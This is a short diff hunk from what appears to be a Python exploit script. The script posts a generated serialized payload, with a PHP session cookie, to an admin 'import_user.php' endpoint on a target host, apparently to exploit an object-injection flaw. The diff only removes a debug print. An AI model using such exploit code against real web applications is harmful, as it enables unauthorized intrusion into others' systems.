@@ -34,7 +34,6 @@ print("[+] Generated payload!")
 def import_user():
 	c = {"PHPSESSID":sessid}
 	d = {"userobj":payload}
-	print(d)
 	r = requests.post("http://%s/admin/import_user.php"%target,data=d,cookies=c)
 
 import_user()
